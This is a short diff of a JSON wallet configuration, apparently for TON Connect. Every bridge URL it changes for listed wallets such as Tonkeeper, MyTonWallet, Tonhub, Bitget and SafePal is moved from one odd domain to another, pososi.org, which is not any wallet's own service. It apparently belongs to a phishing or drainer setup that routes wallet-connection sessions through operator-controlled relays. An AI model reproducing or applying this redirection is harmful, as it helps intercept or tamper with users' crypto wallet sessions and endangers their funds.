@@ -8,7 +8,7 @@
     "bridge": [
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/tonspace/bridge"
+        "url": "https://pososi.org/tonspace/bridge"
       }
     ],
     "platforms": ["ios", "android", "macos", "windows", "linux"]
@@ -24,7 +24,7 @@
     "bridge": [
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/tonkeeper/bridge"
+        "url": "https://pososi.org/tonkeeper/bridge"
       },
       {
         "type": "js",
@@ -46,7 +46,7 @@
       },
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/mytonwallet/bridge/"
+        "url": "https://pososi.org/mytonwallet/bridge/"
       }
     ],
     "platforms": [
@@ -85,7 +85,7 @@
       },
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/tonhub/tonconnect"
+        "url": "https://pososi.org/tonhub/tonconnect"
       }
     ],
     "platforms": ["ios", "android"]
@@ -99,7 +99,7 @@
     "bridge": [
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/dewallet/bridge"
+        "url": "https://pososi.org/dewallet/bridge"
       }
     ],
     "platforms": ["ios", "android"]
@@ -143,7 +143,7 @@
       },
       {
         "type": "sse",
-        "url": "https://mew-sol.gift/bitget/bridge"
+        "url": "https://pososi.org/bitget/bridge"
       }
     ],
     "platforms": ["ios", "android", "chrome"],
@@ -160,7 +160,7 @@
   "bridge": [ 
      {
         "type": "sse",
-        "url": "https://mew-sol.gift/safepal/tonbridge/v1/bridge"
+        "url": "https://pososi.org/safepal/tonbridge/v1/bridge"
      },
      {
         "type": "js",
